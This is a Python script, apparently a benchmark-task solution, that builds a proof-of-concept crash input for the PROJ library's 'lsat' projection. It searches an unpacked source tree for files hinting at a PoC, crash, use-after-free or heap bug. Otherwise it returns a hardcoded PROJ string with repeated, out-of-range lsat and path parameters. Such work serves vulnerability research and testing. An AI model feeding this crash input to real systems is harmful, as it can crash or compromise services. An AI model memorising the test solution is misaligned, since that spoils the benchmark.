import os
import tarfile
import tempfile
import shutil
import stat
from typing import Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmpdir = tempfile.mkdtemp(prefix="poc_gen_")
        try:
            try:
                with tarfile.open(src_path, "r:*") as tar:
                    members = [m for m in tar.getmembers() if self._is_safe_member(m, tmpdir)]
                    tar.extractall(path=tmpdir, members=members)
            except Exception:
                return self._fallback_poc()

            poc = self._scan_for_poc(tmpdir)
            if poc is not None:
                return poc
            return self._fallback_poc()
        finally:
            try:
                shutil.rmtree(tmpdir)
            except Exception:
                pass

    def _is_safe_member(self, member: tarfile.TarInfo, base_dir: str) -> bool:
        try:
            target_path = os.path.join(base_dir, member.name)
            abs_base = os.path.abspath(base_dir)
            abs_target = os.path.abspath(target_path)
            return abs_target == abs_base or abs_target.startswith(abs_base + os.sep)
        except Exception:
            return False

    def _scan_for_poc(self, root_dir: str) -> Optional[bytes]:
        target_len = 38
        best_data: Optional[bytes] = None
        best_score: Optional[int] = None

        for dirpath, _, filenames in os.walk(root_dir):
            for fn in filenames:
                path = os.path.join(dirpath, fn)
                try:
                    st = os.stat(path)
                except OSError:
                    continue
                if not stat.S_ISREG(st.st_mode):
                    continue
                size = st.st_size
                if size == 0 or size > 512:
                    continue
                try:
                    with open(path, "rb") as f:
                        data = f.read()
                except OSError:
                    continue
                if not data:
                    continue
                if b"\x00" in data:
                    continue

                lower = data.lower()
                name_lower = fn.lower()
                has_lsat_hint = (
                    b"lsat" in lower
                    or b"pj_lsat" in lower
                    or b"+proj=lsat" in lower
                )
                has_name_hint = any(h in name_lower for h in ("poc", "crash", "uaf", "heap"))
                if not has_lsat_hint and not has_name_hint:
                    continue

                score = abs(len(data) - target_len)
                # Prefer files with hintful names slightly
                if has_name_hint:
                    score = max(score - 1, 0)

                if best_score is None or score < best_score:
                    best_score = score
                    best_data = data

        return best_data

    def _fallback_poc(self) -> bytes:
        return (
            b"+proj=longlat +datum=WGS84\n"
            b"+proj=lsat +lsat=0 +path=0 +lsat=6 +path=999\n"
        )
